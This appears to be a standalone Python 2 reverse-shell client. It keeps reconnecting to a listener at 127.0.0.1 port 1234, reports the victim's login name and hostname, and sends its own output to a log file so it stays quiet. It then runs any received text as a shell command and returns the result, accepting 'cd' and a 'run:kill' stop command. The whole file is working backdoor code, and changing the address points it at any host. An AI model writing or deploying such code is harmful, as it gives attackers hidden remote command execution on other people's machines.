#!/usr/bin/python
import socket
import os
import sys
from time import sleep

TCP_IP = '127.0.0.1'
TCP_PORT = 1234
BUFFER_SIZE = 1024
MESSAGE = "Hello, World!"
run = True

while (run):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while (1):
        try:
            s.connect((TCP_IP, TCP_PORT))
            break
        except:
            ##print("erreur fdp")
            sleep(1)
    ##print("HELLO")
    saveout = sys.stdout
    fsock = open('out.log', 'w')
    sys.stdout = fsock
    sys.stderr = fsock

    login = os.getlogin()
    hostname = socket.gethostname()


    s.send("login:" + login + ":" + hostname + "\n")

    while (1):
        data = s.recv(BUFFER_SIZE)
        if (not data):
            break
        if (data[:3] == "cd "):
            os.chdir(data[3:len(data) - 1])
        elif (data == "run:kill\n"):
            run = False
            break
        else:
            try:
                ret = os.popen(data)
                s.send(ret.read())
            except:
                s.send("Unexpected error:", sys.exc_info()[0])
    s.close()
